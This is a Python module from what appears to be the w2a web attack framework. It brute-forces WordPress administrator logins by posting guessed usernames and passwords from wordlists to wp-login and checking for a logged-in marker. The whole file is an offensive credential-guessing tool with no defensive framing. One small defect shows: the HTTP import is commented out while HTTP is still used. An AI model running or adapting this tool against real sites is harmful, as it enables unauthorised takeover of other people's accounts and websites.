#  Copyright 2012 Kid :">

from w2a.core.templates import Templates
from w2a.config import CONFIG
# from w2a.lib.net.http import HTTP

from urllib.parse import quote_plus
class Module(Templates):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.version		= 1
		self.author			= [ 'Kid' ]
		self.description 	= 'Brute wordpress administrator account'
		self.detailed_description	= 'This module retreives connect with dictionary username and password'
		#########################################
		self.options.add_string('URL', 'Link login')
		self.options.add_string('USERNAME', 'Account login', False, default = 'admin')
		self.options.add_string('PASSWORD', 'Password login', False)
		self.options.add_integer('THREADS', 'Thread of bruter', default = 5)
		self.options.add_boolean('VERBOSE', 'Verbose', default = True)
		self.options.add_path('USERLIST', 'File containing passwords to test', default = CONFIG.DATA_PATH + '/brute/username.lst')
		self.options.add_path('PASSLIST', 'File containing usernames to test', default = CONFIG.DATA_PATH + '/brute/pass.vn')
		
		self.advanced_options.add_integer('TIMEOUT', 'Time out request', default = CONFIG.TIME_OUT)
		self.advanced_options.add_integer('DELAY', 'Delay time if thread = 1', default = 1)
	def run(self, frmwk, args):
		module_name		= 'attack/web_bruter'

		frmwk.print_status('Init paprams!')
		victim				= HTTP(self.options['URL'], timeout = self.advanced_options['TIMEOUT'])
		victim.storecookie	= True
		checktype			= 'successstr'
		tokenstr			= 'no-unread-messages'

		param		= 'log=__USER__&pwd=__PASS__&wp-submit=Log+In&redirect_to='+quote_plus(self.options['URL'])+'&testcookie=1'
		frmwk.print_status('Start bruteforcer!')
		bruter	= frmwk.modules[module_name]
		bruter.options.add_string('URL', 'Link login', default = self.options['URL'])
		bruter.options.add_string('USERNAME', 'Account login', default = self.options['USERNAME'])
		bruter.options.add_string('PASSWORD', 'Password login', default = self.options['PASSWORD'])
		bruter.options.add_string('DATA', 'Date with POST method', default = param)
		bruter.options.add_string('CHECKTYPE', 'Type of checker success login', default = checktype)
		bruter.options.add_string('TOKEN', 'Error string', default = tokenstr)
		bruter.options.add_integer('THREADS', 'Date with POST method', default = self.options['THREADS'])
		bruter.options.add_path('USERLIST', 'passwords to test', default = self.options['USERLIST'])
		bruter.options.add_path('PASSLIST', 'usernames to test', default = self.options['PASSLIST'])
		bruter.options.add_boolean('VERBOSE', 'Verbose', default = self.options['VERBOSE'])
		bruter.advanced_options.add_string('COOKIE', 'Cookie', default = victim.headers['Cookie'] if victim.headers['Cookie'] else None)
		bruter.advanced_options.add_integer('DELAY', 'Delay time', default = self.advanced_options['DELAY'])
		bruter.advanced_options.add_integer('TIMEOUT', 'Time out request', default = self.advanced_options['TIMEOUT'])
		bruter.advanced_options.add_boolean('STOP', 'Stop scanning', default = True)
		bruter.run(frmwk, None)
		frmwk.reload_module(module_name)